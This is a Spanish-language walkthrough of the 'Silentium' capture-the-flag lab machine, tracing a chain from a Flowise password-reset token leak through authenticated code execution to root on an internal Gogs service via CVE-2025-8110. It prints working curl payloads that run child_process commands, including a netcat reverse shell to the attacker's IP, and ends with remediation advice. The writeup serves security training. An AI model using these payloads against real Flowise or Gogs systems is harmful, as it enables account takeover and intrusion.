---
layout: single
classes: wide
title: "Silentium - Writeup"
date: 2026-04-16
difficulty: FÃ¡cil
operating_system: Linux
service_hint: Flowise 3.0.5 + Gogs interno
tags:
  - Virtual Host
  - Flowise
  - Password Reset
  - RCE
  - Credenciales
  - Gogs
  - Privilege Escalation
summary: "Cadena de explotaciÃ³n: descubrimiento de un entorno Flowise en staging, toma de cuenta por reseteo inseguro, RCE autenticada en la aplicaciÃ³n, reutilizaciÃ³n de credenciales para SSH y escalada final a root mediante Gogs interno vulnerable a CVE-2025-8110."
---

## InformaciÃ³n general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | FÃ¡cil |
| Tags | `Virtual Host`, `Flowise`, `Password Reset`, `RCE`, `ReutilizaciÃ³n de credenciales`, `Gogs`, `CVE-2025-8110`, `Privilege Escalation` |
{: .info-table}

## Reconocimiento

El primer objetivo fue confirmar la superficie mÃ­nima expuesta y verificar si la web dependÃ­a de nombres virtuales. La combinaciÃ³n `22/tcp` + `80/tcp` ya sugerÃ­a un flujo clÃ¡sico de enumeraciÃ³n web con posible acceso posterior por SSH.

Escaneamos puertos abiertos y descubrimos que solo 22/tcp y 80/tcp respondÃ­an.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.28.251
```

Con los puertos localizados, escaneamos banners y versiones, confirmando OpenSSH y la redirecciÃ³n a `silentium.htb`.

```bash
nmap -p22,80 -sCV 10.129.28.251
```

Indicadores relevantes de esta fase:

- `80/tcp` redirige a `http://silentium.htb/`, asÃ­ que habÃ­a que trabajar con virtual host.
- `22/tcp` expone OpenSSH sobre Ubuntu, una superficie candidata para reutilizaciÃ³n posterior de credenciales.
- El sitio principal no mostraba funcionalidad sensible directa, asÃ­ que el siguiente paso correcto era expandir superficie con fuzzing de subdominios.

## EnumeraciÃ³n web

Primero convenÃ­a medir si el sitio principal tenÃ­a rutas interesantes antes de saltar a hipÃ³tesis mÃ¡s complejas.

Fuzzeamos directorios en el virtual host principal, pero los resultados fueron mÃ­nimos.

```bash
gobuster dir -u http://silentium.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200 --exclude-length 8753
```

El comportamiento de la web principal era deliberadamente austero, asÃ­ que pasamos a fuzzear subdominios.

Fuzzeamos virtual hosts y descubrimos `staging.silentium.htb`.

```bash
wfuzz -H "Host: FUZZ.silentium.htb" --hc 404,403 --hh=178 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  http://silentium.htb
```

Subdominio relevante:

- `staging.silentium.htb`

Antes de inspeccionar la SPA, probamos fuzzing de directorios sobre staging, pero no encontramos nada fuera de lo esperado.

## MetodologÃ­a de anÃ¡lisis del vector inicial

El vector de entrada se priorizÃ³ en el subdominio `staging.silentium.htb` porque los entornos de staging suelen tener configuraciones menos restrictivas que producciÃ³n, incluyendo endpoints de depuraciÃ³n, registros de usuario abiertos o flujos de autenticaciÃ³n mal implementados.

La identificaciÃ³n de Flowise 3.0.5 como plataforma low-code orientÃ³ la investigaciÃ³n hacia endpoints de autenticaciÃ³n y recuperaciÃ³n de cuenta. En aplicaciones de este tipo, un flujo de reset mal implementado puede equivaler a takeover completo de la cuenta.

## InvestigaciÃ³n de vulnerabilidades

Dos vectores principales guiaron la fase de investigaciÃ³n:

- **Password reset con fuga de informaciÃ³n**: El endpoint `account/forgot-password` no solo diferenciaba usuarios vÃ¡lidos de inexistentes, sino que devolvÃ­a un `tempToken` reutilizable en la respuesta, permitiendo reseteo de contraseÃ±a sin verificaciÃ³n adicional.
- **RCE vÃ­a customMCP en Flowise**: La plataforma permite cargar nodos personalizados que evalÃºan configuraciÃ³n controlada por el usuario, un patrÃ³n clÃ¡sico de ejecuciÃ³n de cÃ³digo dinÃ¡mico sin las restricciones necesarias.
- **CVE-2025-8110 en Gogs**: Vulnerabilidad de symlink en repositorios que permite sobrescribir `.git/config` con un `sshCommand` malicioso, forzando ejecuciÃ³n de comandos del lado del servidor.

Una vez hallado el entorno `staging`, descargamos la portada para identificar la tecnologÃ­a.

```bash
curl -s http://staging.silentium.htb | tee index.html
```

Del HTML extrajimos el bundle principal para revisar su contenido.

```bash
grep -i js index.html
```

El cÃ³digo cliente y el `view-source` dejaban una pista muy clara: el entorno corrÃ­a **FlowiseAI**.

Descargamos el bundle JavaScript para buscar rutas API embebidas.

```bash
curl -s http://staging.silentium.htb/assets/index-C6GKaUTA.js -o main.js
```

ExtraÃ­mos endpoints `/api/v1/` del bundle y descubrimos rutas como `version` y `account/forgot-password`.

```bash
grep -oE '/api/v1/[a-zA-Z0-9_/.-]*' main.js | sort -u
```

El endpoint mÃ¡s Ãºtil para perfilar la versiÃ³n era `version`.

Consultamos la API de versiones y confirmamos Flowise 3.0.5.

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

Salida relevante:

```json
{"version":"3.0.5"}
```

## Toma de cuenta en Flowise

Con Flowise identificado, el siguiente paso lÃ³gico fue revisar endpoints de autenticaciÃ³n y recuperaciÃ³n de acceso. En aplicaciones de este tipo, un flujo de reset mal implementado puede equivaler a takeover completo de la cuenta.

Fuzzeamos rutas adicionales bajo `/api/v1/` y descubrimos `account/forgot-password`.

```bash
gobuster dir -u http://staging.silentium.htb/api/v1/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200 --exclude-length=31,3142
```

La ruta especialmente interesante fue `account/forgot-password`, porque permite diferenciar usuarios vÃ¡lidos frente a inexistentes.

Probamos el flujo de recuperaciÃ³n con un correo arbitrario y confirmamos que la API diferenciaba usuarios vÃ¡lidos de inexistentes.

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"admin@silentium.htb"}}'
```

Una vez validado el patrÃ³n, se podÃ­a usar fuzzing para descubrir una cuenta real.

Fuzzeamos nombres de usuario contra el reseteo y descubrimos `ben@silentium.htb`.

```bash
wfuzz -z file,/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"FUZZ@silentium.htb"}}' \
  --hc 400 --hs "User Not Found" --hh 104 \
  http://staging.silentium.htb/api/v1/account/forgot-password
```

Usuario identificado:

- `ben@silentium.htb`

El hallazgo crÃ­tico aparece al repetir el flujo con la cuenta vÃ¡lida: la respuesta devuelve datos sensibles del usuario, incluyendo un `tempToken` reutilizable para resetear la contraseÃ±a.

Invocamos el reseteo sobre `ben` y descubrimos que la API devolvÃ­a un `tempToken` reutilizable.

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

Salida relevante, con valores sensibles redactados:

```json
{
  "user": {
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "[REDACTED]",
    "tempToken": "[REDACTED]"
  }
}
```

Con ese `tempToken`, el takeover era directo.

Con el `tempToken`, cambiamos la contraseÃ±a de `ben` y tomamos control de la cuenta.

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "[REDACTED]",
      "password": "[REDACTED]"
    }
  }'
```

En este punto ya habÃ­a acceso legÃ­timo a la interfaz de Flowise como `ben`. Las capturas originales del panel no estaban disponibles en el repositorio, asÃ­ que ese paso se resume sin imÃ¡genes.

## RCE autenticada en Flowise

Con la cuenta comprometida, el siguiente objetivo fue convertir acceso a panel en ejecuciÃ³n remota. El vector Ãºtil estaba en la carga de nodos `customMCP`, donde la aplicaciÃ³n evaluaba configuraciÃ³n controlada por el usuario.

Las notas originales incluyen una referencia a una CVE en esta fase, pero no dejan evidencia suficiente para atribuir con rigor un identificador concreto solo a partir del material conservado. Por eso la omito y me centro en el comportamiento observado.

Probamos ejecuciÃ³n de cÃ³digo a travÃ©s de `node-load-method/customMCP` y logramos ejecutar comandos en el contenedor.

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [REDACTED]" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"curl http://10.10.14.191\");return 1;})()})"
    }
  }'
```

Para confirmar la salida de red desde el objetivo, bastaba exponer un servidor HTTP simple en la mÃ¡quina atacante.

Pusimos un servidor HTTP temporal para capturar el callback del contenedor y confirmar la ejecuciÃ³n.

```bash
python3 -m http.server 80
```

Con la ejecuciÃ³n verificada, el siguiente paso fue pedir una reverse shell.

Preparamos un listener para recibir la shell inversa desde el contenedor Flowise.

```bash
nc -nlvp 4444
```

Reemplazamos la prueba HTTP por una shell inversa dirigida a nuestro listener.

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [REDACTED]" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"nc 10.10.14.191 4444 -e sh\");return 1;})()})"
    }
  }'
```

La shell recibida no pertenecÃ­a todavÃ­a al host principal, sino al contenedor de la aplicaciÃ³n. El dato decisivo estaba en el entorno: credenciales operativas reutilizadas fuera de Flowise.

Inspeccionamos las variables de entorno en el contenedor y encontramos credenciales reutilizadas.

```bash
env
```

Valores relevantes, redactados deliberadamente:

```text
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=[REDACTED]
SMTP_PASSWORD=[REDACTED]
JWT_AUTH_TOKEN_SECRET=[REDACTED]
JWT_REFRESH_TOKEN_SECRET=[REDACTED]
```

## Acceso al host por SSH

La reutilizaciÃ³n mÃ¡s Ãºtil fue `FLOWISE_PASSWORD`, porque la cuenta `ben` existÃ­a tambiÃ©n en el sistema Linux. Antes de perder tiempo con mÃ¡s escape de contenedor, tenÃ­a mÃ¡s sentido validar directamente SSH.

Probamos `FLOWISE_PASSWORD` como SSH de `ben` y accedimos directamente al host.

```bash
ssh ben@silentium.htb
```

La sesiÃ³n abre correctamente como `ben`, lo que confirma reutilizaciÃ³n de credenciales entre la aplicaciÃ³n y el sistema operativo. La flag de usuario existÃ­a en `~/user.txt`, pero su valor se omite deliberadamente.

## EnumeraciÃ³n local

Ya dentro del host, lo correcto era revisar puertos locales y servicios no publicados externamente antes de insistir con SUIDs o vectores genÃ©ricos.

Listamos servicios en escucha en el host y descubrimos Gogs (`3001`) y MailHog (`8025`) en localhost.

```bash
ss -tulnp
```

Hallazgos Ãºtiles:

- `127.0.0.1:3001` expone un servicio web interno.
- `127.0.0.1:8025` sugiere una consola SMTP o MailHog.

Antes de priorizar Gogs, convenÃ­a validar rÃ¡pidamente si `8025` aportaba credenciales o enlaces de reseteo.

Reenviamos `8025` por tÃºnel SSH pero el buzÃ³n de MailHog estaba vacÃ­o â€” no aportÃ³ valor.

```bash
ssh -L 8025:127.0.0.1:8025 ben@silentium.htb
```

La consola confirmÃ³ que se trataba de MailHog, pero el buzÃ³n estaba vacÃ­o y no aportÃ³ ningÃºn salto adicional.

![Consola MailHog sin mensajes Ãºtiles](/images/writeups/silentium/mailhog-empty.png)

La pista realmente prometedora era `3001`, porque los artefactos del sistema apuntaban a una instalaciÃ³n local de **Gogs**.

Buscamos directorios de Gogs y confirmamos su instalaciÃ³n local.

```bash
find / -path "*gogs*" -type d 2>/dev/null
```

Para interactuar con el servicio interno desde la mÃ¡quina atacante sin tocar el firewall del objetivo, lo mÃ¡s limpio era usar tunelizaciÃ³n SSH.

Reenviamos `3001` por tÃºnel SSH y accedimos al Gogs interno desde nuestra mÃ¡quina.

```bash
ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
```

El tÃºnel dejaba visible la portada de Gogs y confirmaba que la superficie interna era una forge Git completa, no un servicio auxiliar menor.

![Portada del Gogs interno expuesto por tÃºnel SSH](/images/writeups/silentium/gogs-home.png)

El comportamiento de `Gogs`, sumado a la presencia de directorios de sesiÃ³n y actividad reciente, justificaba probar un vector conocido de escritura vÃ­a symlink en repositorios.

## Escalada a root mediante Gogs

El material fuente incluye un exploit completo que abusa de `CVE-2025-8110`, una vulnerabilidad de Gogs basada en symlink + sobrescritura de `.git/config` para forzar ejecuciÃ³n de comandos del lado del servidor. En este caso sÃ­ hay evidencia suficiente para nombrarla porque la PoC estÃ¡ incluida y la explotaciÃ³n termina con shell como `root`.

La instancia ademÃ¡s permitÃ­a registro de usuarios, lo que hacÃ­a posible crear una cuenta desechable y generar un token personal para interactuar con la API sin depender de credenciales privilegiadas previas dentro de Gogs.

![Formulario de registro disponible en el Gogs interno](/images/writeups/silentium/gogs-signup.png)

Una vez creada la cuenta, se generÃ³ un token de acceso personal. La captura se conserva porque contextualiza el flujo previo a la PoC, pero el valor del token fue redactado antes de publicarla.

![GeneraciÃ³n de token en Gogs con el valor redactado](/images/writeups/silentium/gogs-token-redacted.png)

Antes de lanzar la PoC, hacÃ­a falta preparar un listener para la reverse shell resultante.

Preparamos un listener con `rlwrap` para recibir la shell del exploit.

```bash
rlwrap nc -lnvp 4444
```

DespuÃ©s, se ejecuta la PoC contra el Gogs interno usando un token API vÃ¡lido. El token se muestra redactado.

Lanzamos el exploit de `CVE-2025-8110`, que creÃ³ un symlink y ejecutÃ³ nuestra reverse shell como `root`.

```bash
python3 exploit.py \
  -u http://127.0.0.1:3001 \
  -lh 10.10.14.191 \
  -lp 4444 \
  --token [REDACTED]
```

La PoC crea un repositorio, sube un symlink a `.git/config`, sobrescribe `sshCommand` con una reverse shell y fuerza a Gogs a ejecutar esa configuraciÃ³n del lado servidor. El resultado es una shell como `root` dentro de la ruta temporal del repositorio local procesado por Gogs.

Con acceso a `root`, ya solo quedaba leer la flag final. Su valor se omite deliberadamente.

LeÃ­mos la flag de `root` para completar la mÃ¡quina.

```bash
cat /root/root.txt
```

## Cadena de explotaciÃ³n

```text
Virtual host staging.silentium.htb
-> Flowise 3.0.5 expuesto
-> enumeraciÃ³n de usuarios vÃ­a forgot-password
-> fuga de tempToken y reset de contraseÃ±a de ben
-> acceso autenticado a Flowise
-> RCE vÃ­a customMCP
-> exposiciÃ³n de FLOWISE_PASSWORD en el contenedor
-> reutilizaciÃ³n de credenciales por SSH como ben
-> descubrimiento de Gogs interno en 127.0.0.1:3001
-> explotaciÃ³n de CVE-2025-8110
-> shell como root
```

## Flags

| Flag | Valor |
|------|-------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## Lecciones tÃ©cnicas

1. Un flujo de recuperaciÃ³n de cuenta no puede devolver secretos reutilizables al cliente; eso convierte password reset en account takeover.
2. En plataformas tipo low-code o AI workflow, cualquier campo evaluado dinÃ¡micamente debe tratarse como superficie de RCE.
3. Las credenciales de aplicaciÃ³n no deben reutilizarse como contraseÃ±a del sistema.
4. Un servicio interno accesible solo por localhost sigue siendo explotable si un usuario comprometido puede tunelizarlo por SSH.

## RemediaciÃ³n

1. Corregir el flujo de recuperaciÃ³n de cuentas para que nunca devuelva `tempToken`, hashes ni metadatos sensibles del usuario.
2. Eliminar cualquier evaluaciÃ³n dinÃ¡mica insegura en nodos `customMCP` o mecanismos equivalentes de Flowise.
3. Segregar credenciales entre aplicaciÃ³n, correo y sistema operativo.
4. Actualizar o aislar Gogs para eliminar la exposiciÃ³n a `CVE-2025-8110` y revisar permisos de uso de tokens API internos.

## ConclusiÃ³n

HTB Silentium es una mÃ¡quina de dificultad FÃ¡cil que combina la explotaciÃ³n de un flujo inseguro de recuperaciÃ³n de contraseÃ±a en Flowise 3.0.5 para tomar control de una cuenta, ejecuciÃ³n remota de cÃ³digo a travÃ©s de nodos `customMCP`, reutilizaciÃ³n de credenciales para acceso SSH, y escalada a root mediante CVE-2025-8110 en Gogs. La lecciÃ³n principal es que un staging mal configurado puede exponer la superficie completa de ataque, y que las credenciales de aplicaciÃ³n nunca deben reutilizarse como credenciales del sistema.
